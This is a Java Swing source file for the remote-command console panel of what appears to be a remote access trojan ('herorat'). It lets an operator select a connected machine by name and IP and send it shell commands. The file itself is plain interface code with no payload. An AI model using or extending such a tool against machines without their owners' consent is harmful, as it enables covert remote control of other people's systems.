package net.herorat.gui;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;

import javax.naming.BinaryRefAddr;
import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

import net.herorat.Main;
import net.herorat.features.console.Console;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;


public class PanelConsole extends JPanel
{
	private static final long serialVersionUID = 4980288761241261411L;
	
	private JLabel label_select;
	private JButton button_start;
	private boolean running;
	
	private JScrollPane scroll_console;
	public JTextArea area_console;
	
	private JLabel label_input;
	private JTextField field_input;
	private JButton button_input;
	
	private Server server = null;

	public PanelConsole()
	{
		initComponents();
		display();
	}
	
	private void initComponents()
	{
		setLayout(new BorderLayout(5, 0));
		createSelect();
		createOutput();
		createInput();
	}
	
	private void display()
	{
		setVisible(true);
	}
	
	private void createSelect()
	{
		label_select = new JLabel("Select a user from the tree list.");
		button_start = new JButton("Start service");
		button_start.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				if(running){
					stopService();
				}else{
					startService();
				}
			}
		});
		
		JPanel top_panel = new JPanel();
		top_panel.setLayout(new BorderLayout(5, 0));
		top_panel.setBorder(BorderFactory.createEmptyBorder(0, 2, 5, 2));
		top_panel.add(label_select, BorderLayout.LINE_START);
		top_panel.add(button_start, BorderLayout.LINE_END);
		add(top_panel, BorderLayout.NORTH);

	}

	public Server getCurrentServer(){
		return server;
	}

	private void startService(){
		server = Main.mainWindow.ServerStatusTree.getSelectedServer();
		if (server!= null) {
			running = true;
			button_start.setText("Stop service");
			label_select.setText("Talking to: "+server.getServerName()+"@"+server.getIp());
			area_console.setText(server.buffer_console.toString());
		}else{
			stopService();
		}
	}

	private void stopService(){
		server = null;
		running = false;
		button_start.setText("Start service");
		label_select.setText("Select a user from the tree list.");
		area_console.setText(">");
	}

	private void createOutput()
	{
		scroll_console = new JScrollPane();
		area_console = new JTextArea();
		area_console.setColumns(55);
		area_console.setRows(22);
		area_console.setLineWrap(true);
		area_console.setEditable(false);
		area_console.setBackground(Color.BLACK);
		area_console.setForeground(Color.LIGHT_GRAY);
		scroll_console.setViewportView(area_console);
		area_console.setText(">");
		add(scroll_console, BorderLayout.CENTER);
	}
	
	private void createInput()
	{
		label_input = new JLabel("Cmd: ");
		
		field_input = new JTextField();
		field_input.addKeyListener(new KeyAdapter() {
			public void keyReleased(KeyEvent e) {}
			public void keyTyped(KeyEvent e) {}
			public void keyPressed(KeyEvent e)
			{
				int key = e.getKeyCode();
				if (key == KeyEvent.VK_ENTER)
				{
					sendConsoleCmd();
				}
			}
		});
		field_input.requestFocusInWindow();
		
		button_input = new JButton("Send");
		button_input.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt)
			{
				sendConsoleCmd();
			}
		});
		
		JPanel bottomPanel = new JPanel();
		bottomPanel.setLayout(new BorderLayout(5, 0));
		bottomPanel.setBorder(BorderFactory.createEmptyBorder(5, 2, 5, 2));
		bottomPanel.add(label_input, BorderLayout.LINE_START);
		bottomPanel.add(field_input);
		bottomPanel.add(button_input, BorderLayout.LINE_END);
		add(bottomPanel, BorderLayout.SOUTH);
	}
	
	private void sendConsoleCmd()
	{
		if (server != null)
		{
			server.buffer_console.append("> " + field_input.getText() + "\n");
			Console.send(server, field_input.getText());
			area_console.setText(server.buffer_console.toString());
		}
		else
		{
			area_console.setText(area_console.getText() + "> No connection found!\n");
		}
		field_input.setText("");
	}
}
